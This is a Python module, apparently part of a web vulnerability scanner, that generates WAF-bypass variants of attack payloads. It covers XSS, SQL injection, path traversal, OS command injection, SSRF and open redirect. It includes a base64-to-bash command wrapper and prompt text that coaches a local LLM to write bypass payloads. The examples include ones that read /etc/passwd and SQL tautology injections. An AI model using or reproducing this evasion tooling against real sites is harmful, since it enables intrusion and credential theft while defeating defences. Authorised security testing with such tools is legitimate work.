"""
Payload Encoder
===============
エンコーディング ユーティリティ集。

LLM が生成したベースペイロードに自動的に WAF バイパス用のエンコード変換を
適用し、ペイロードリストを多様化する。

Ollama など小さなモデルに「自分でエンコードしろ」と指示するより、
ベースペイロードだけ生成させてここで変換する方が正確で安定する。

利用例:
    from wscan.payload_encoder import generate_variants, ENCODING_EXAMPLES

    # 単一ペイロードを展開
    extras = generate_variants("<script>alert(1)</script>", "xss", max_variants=3)

    # LLM プロンプトにエンコード例を注入
    print(ENCODING_EXAMPLES["xss"])
"""
from __future__ import annotations

import base64
import re
import urllib.parse
from typing import Callable


# ── 基本エンコード関数 ─────────────────────────────────────────────────────

def url_encode(s: str) -> str:
    """全文字を %XX URL エンコード（シングルエンコード）。"""
    return urllib.parse.quote(s, safe='')


def double_url_encode(s: str) -> str:
    """ダブル URL エンコード: % → %25 に変換して二重デコード WAF を検出。"""
    return urllib.parse.quote(url_encode(s), safe='')


def triple_url_encode(s: str) -> str:
    """トリプル URL エンコード: 一部 WAF の三重デコード経路を検出。"""
    return urllib.parse.quote(double_url_encode(s), safe='')


def html_entity_decimal(s: str) -> str:
    """HTML 10進エンティティ: a → &#97;"""
    return ''.join(f'&#{ ord(c)};' for c in s)


def html_entity_hex(s: str) -> str:
    """HTML 16進エンティティ: a → &#x61;"""
    return ''.join(f'&#x{ord(c):02x};' for c in s)


def js_unicode(s: str) -> str:
    r"""JavaScript Unicode エスケープ: a → a

    JS の ``\uXXXX`` は UTF-16 コードユニット単位なので、BMP 外（絵文字等）は
    サロゲートペアで出す（例: 😀 → 😀）。``ord(c):04x`` を直接使うと
    ``ὠ0`` のように 5 桁となり JS では別文字に化けるため UTF-16 で符号化する。
    """
    units = s.encode('utf-16-be')
    return ''.join(
        f'\\u{(units[i] << 8) | units[i + 1]:04x}'
        for i in range(0, len(units), 2)
    )


def js_hex(s: str) -> str:
    r"""JavaScript \xNN エスケープ: a → \x61

    ``\xNN`` は 2 桁固定なので 0xFF を超える文字は表現できない。超える場合は
    ``\uXXXX``（UTF-16）へフォールバックする（``\x3042`` のような不正出力を避ける）。
    """
    out: list[str] = []
    for c in s:
        code = ord(c)
        if code <= 0xFF:
            out.append(f'\\x{code:02x}')
        else:
            out.append(js_unicode(c))
    return ''.join(out)


def base64_encode(s: str) -> str:
    """Base64 エンコード。"""
    return base64.b64encode(s.encode()).decode()


def base64_shell_eval(cmd: str) -> str:
    """シェルコマンドを echo <b64>|base64 -d|bash ラッパーに変換。"""
    b64 = base64.b64encode(cmd.encode()).decode()
    return f"echo {b64}|base64 -d|bash"


def hex_string_mysql(s: str) -> str:
    """MySQL の 0x... 形式 16進文字列に変換。 例: admin → 0x61646d696e"""
    return '0x' + s.encode().hex()


def utf8_overlong_slash(path: str) -> str:
    """
    / を UTF-8 overlong %c0%af に置換（IIS / レガシー WAF バイパス）。
    \\ は %c1%9c に置換。
    """
    return path.replace('/', '%c0%af').replace('\\', '%c1%9c')


def null_byte_append(s: str) -> str:
    """末尾に Null byte (%00) を付加して拡張子チェックをバイパス。"""
    return s + '%00'


def mixed_case(s: str) -> str:
    """大文字/小文字を交互に変換してフィルタをバイパス。"""
    return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))


def inline_comment_sql(s: str, keywords: tuple[str, ...] = ('SELECT', 'UNION', 'WHERE', 'OR', 'AND', 'FROM')) -> str:
    """
    SQL キーワードを /**/ で分割してフィルタをバイパス。
    例: SELECT → SE/**/LECT
    """
    result = s.upper()
    for kw in keywords:
        if kw in result:
            split = len(kw) // 2
            result = result.replace(kw, kw[:split] + '/**/' + kw[split:], 1)
            break
    return result


# ── チェックタイプ別バリアント生成 ────────────────────────────────────────

def _xss_variants(payload: str) -> list[str]:
    variants: list[str] = []
    # %XX
    variants.append(url_encode(payload))
    # %25XX (double)
    variants.append(double_url_encode(payload))
    # HTML エンティティで < > を変換
    html_v = payload.replace('<', '&lt;').replace('>', '&gt;')
    if html_v != payload:
        variants.append(html_v)
    # HTML 10進エンティティ版 (先頭タグの < だけ)
    dec_v = payload.replace('<', '&#60;').replace('>', '&#62;')
    if dec_v != payload:
        variants.append(dec_v)
    # スクリプトタグ内の alert を JS hex に変換
    if 'alert' in payload:
        variants.append(payload.replace('alert', '\\x61lert'))
    return variants


def _sqli_variants(payload: str) -> list[str]:
    variants: list[str] = []
    # URL エンコード
    variants.append(url_encode(payload))
    # ダブル URL エンコード
    variants.append(double_url_encode(payload))
    # inline comment SQL
    commented = inline_comment_sql(payload)
    if commented != payload.upper():
        variants.append(commented)
    # 文字列リテラルを MySQL hex に変換: 'admin' → 0x61646d696e
    m = re.search(r"'(\w+)'", payload)
    if m:
        word = m.group(1)
        hex_val = hex_string_mysql(word)
        variants.append(payload.replace(f"'{word}'", hex_val, 1))
    # スペースを /*_*/ に変換（WAF スペース検出をバイパス）
    space_v = payload.replace(' ', '/**/')
    if space_v != payload:
        variants.append(space_v)
    return variants


def _path_traversal_variants(payload: str) -> list[str]:
    variants: list[str] = []
    variants.append(url_encode(payload))
    variants.append(double_url_encode(payload))
    variants.append(triple_url_encode(payload))
    variants.append(utf8_overlong_slash(payload))
    # ../ → ....// (フィルタが ../  を消しても ../ が残る)
    stripped_v = payload.replace('../', '....//').replace('..\\', '....\\\\')
    if stripped_v != payload:
        variants.append(stripped_v)
    # null byte
    if '%00' not in payload and '\x00' not in payload:
        variants.append(null_byte_append(payload))
    return variants


def _os_variants(payload: str) -> list[str]:
    variants: list[str] = []
    # セパレータを URL エンコード
    sep_v = (
        payload
        .replace(';', '%3b')
        .replace('|', '%7c')
        .replace('&', '%26')
    )
    if sep_v != payload:
        variants.append(sep_v)
    # IFS 変数でスペース代替
    ifs_v = payload.replace(' ', '${IFS}')
    if ifs_v != payload:
        variants.append(ifs_v)
    # 改行セパレータ代替 (%0a)
    nl_v = payload.replace(';', '%0a').replace('|', '%0a')
    if nl_v != payload and nl_v != sep_v:
        variants.append(nl_v)
    # コマンド部分だけ Base64 エンコード
    m = re.split(r'([;|&`$(\n])', payload, maxsplit=1)
    if len(m) >= 3:
        cmd_part = m[2].strip()
        if cmd_part and re.match(r'^[\w\s\-/]+$', cmd_part):
            b64 = base64_shell_eval(cmd_part)
            variants.append(payload.replace(cmd_part, b64, 1))
    return variants


def _ssti_variants(payload: str) -> list[str]:
    variants: list[str] = []
    # URL エンコード（WAF がテンプレート構文を検出する場合）
    variants.append(url_encode(payload))
    # {{ → {%raw%}{{ のような Jinja2 raw タグ迂回は検証用にはそのまま
    return variants


def _open_redirect_variants(payload: str) -> list[str]:
    variants: list[str] = []
    variants.append(url_encode(payload))
    variants.append(double_url_encode(payload))
    # @トリック: https://trusted.com@evil.com
    if payload.startswith('https://') or payload.startswith('http://'):
        host = payload.split('://')[1].rstrip('/')
        variants.append(f'https://trusted.example.com@{host}')
    return variants


def _ssrf_variants(payload: str) -> list[str]:
    variants: list[str] = []
    variants.append(url_encode(payload))
    # 10進 IP アドレス (127.0.0.1 → 2130706433)
    ip_m = re.search(r'(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})', payload)
    if ip_m:
        a, b, c, d = (int(ip_m.group(i)) for i in range(1, 5))
        # 各オクテットが 0..255 の妥当な IPv4 のときだけ 10 進へ変換する
        # （999.999.999.999 のような不正値を誤変換しない）。
        if all(0 <= o <= 255 for o in (a, b, c, d)):
            decimal_ip = (a << 24) | (b << 16) | (c << 8) | d
            variants.append(payload.replace(ip_m.group(0), str(decimal_ip)))
    return variants


_VARIANT_FUNCS: dict[str, Callable[[str], list[str]]] = {
    'xss':             _xss_variants,
    'dom_xss':         _xss_variants,
    'stored_xss':      _xss_variants,
    'sqli':            _sqli_variants,
    'nosql':           _sqli_variants,
    'path_traversal':  _path_traversal_variants,
    'os':              _os_variants,
    'ssti':            _ssti_variants,
    'open_redirect':   _open_redirect_variants,
    'ssrf':            _ssrf_variants,
}


def generate_variants(payload: str, check_type: str, max_variants: int = 3) -> list[str]:
    """
    `payload` の check_type 用エンコード バリアントを最大 `max_variants` 件返す。

    対応していない check_type の場合は空リストを返す。
    """
    fn = _VARIANT_FUNCS.get(check_type)
    if not fn:
        return []
    try:
        raw = fn(payload)
    except Exception:
        return []
    # 重複除去・元ペイロードを除外
    seen: set[str] = {payload}
    unique: list[str] = []
    for v in raw:
        if v and v not in seen:
            seen.add(v)
            unique.append(v)
    return unique[:max_variants]


def expand_payloads(
    payloads: list[str],
    check_type: str,
    max_variants_per_payload: int = 2,
    max_total: int = 30,
) -> list[str]:
    """
    ペイロードリストを受け取り、各ペイロードにエンコードバリアントを追加して返す。

    Parameters
    ----------
    payloads               : 元のペイロードリスト
    check_type             : xss / sqli / os / path_traversal など
    max_variants_per_payload: 各ペイロードに追加するバリアントの上限
    max_total              : 返すリストの総上限

    Returns
    -------
    拡張されたペイロードリスト (元のペイロード → バリアント … の順)
    """
    result: list[str] = []
    seen: set[str] = set()

    for p in payloads:
        if p not in seen:
            seen.add(p)
            result.append(p)
        for v in generate_variants(p, check_type, max_variants_per_payload):
            if v not in seen:
                seen.add(v)
                result.append(v)
        if len(result) >= max_total:
            break

    return result[:max_total]


# ── LLM プロンプト向けエンコード例 ────────────────────────────────────────
# payload_gen.py のプロンプトに注入することで Ollama がエンコード済み
# バリアントも生成できるようになる。

ENCODING_EXAMPLES: dict[str, str] = {
    'xss': (
        "## Encoding Techniques for WAF Bypass\n"
        "Apply these transformations to generate bypass variants:\n"
        "- URL encode: < → %3c, > → %3e, \" → %22\n"
        "- Double URL encode: < → %253c  (% itself is encoded)\n"
        "- HTML decimal: < → &#60;  > → &#62;\n"
        "- HTML hex: < → &#x3c;  > → &#x3e;\n"
        "- JS \\x escape: a → \\x61  l → \\x6c\n"
        "- JS unicode: a → \\u0061\n"
        "Examples of bypass variants:\n"
        '  %3Cscript%3Ealert(1)%3C/script%3E  (URL encoded)\n'
        '  &#60;script&#62;alert(1)&#60;/script&#62;  (HTML decimal)\n'
        '  <img src=x onerror=\\x61lert(1)>  (JS hex in event handler)\n'
        '  <scr\x00ipt>alert(1)</scr\x00ipt>  (null byte in tag)\n'
    ),
    'sqli': (
        "## Encoding Techniques for SQLi WAF Bypass\n"
        "- URL encode: ' → %27, space → %20\n"
        "- Double URL encode: ' → %2527\n"
        "- MySQL hex strings: 'admin' → 0x61646d696e\n"
        "- Inline comments to split keywords: UNION → UN/**/ION\n"
        "- Space alternatives: space → /**/, +, %09, %0a\n"
        "Examples:\n"
        "  '/**/OR/**/1=1--  (inline comments)\n"
        "  ' UNION%0aSELECT%0aNULL--  (newline as space)\n"
        "  ' OR 0x61646d696e=username--  (hex string)\n"
        "  '||'1'='1  (pipe concatenation, Oracle)\n"
    ),
    'path_traversal': (
        "## Encoding Techniques for Path Traversal WAF Bypass\n"
        "- URL encode: ../  → ..%2f\n"
        "- Double URL encode: ../  → ..%252f\n"
        "- Triple URL encode: ../  → ..%25252f\n"
        "- UTF-8 overlong: /  → %c0%af  (legacy IIS bypass)\n"
        "- Strip bypass: ../ → ....//  (after filter removes ../ once)\n"
        "- Null byte: ../../../etc/passwd%00\n"
        "Examples:\n"
        "  ..%252f..%252f..%252fetc%252fpasswd  (double encoded)\n"
        "  ....//....//....//etc//passwd  (strip bypass)\n"
        "  ..%c0%af..%c0%afetc%c0%afpasswd  (UTF-8 overlong)\n"
    ),
    'os': (
        "## Encoding Techniques for OS Injection WAF Bypass\n"
        "- URL encode separators: ; → %3b, | → %7c, & → %26\n"
        "- Newline separator: ; id → %0aid\n"
        "- IFS variable: ; id → ;${IFS}id\n"
        "- No-space: ;id, |id  (no space around command)\n"
        "- Base64: echo d2hvYW1p|base64 -d|bash  (whoami)\n"
        "- Brace expansion: {cat,/etc/passwd}  (no space)\n"
        "- Here-string: bash<<<$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)\n"
        "Examples:\n"
        "  ;${IFS}whoami  (IFS as space)\n"
        "  %0awhoami  (newline separator)\n"
        "  ;{cat,/etc/passwd}  (brace expansion, no space)\n"
    ),
}
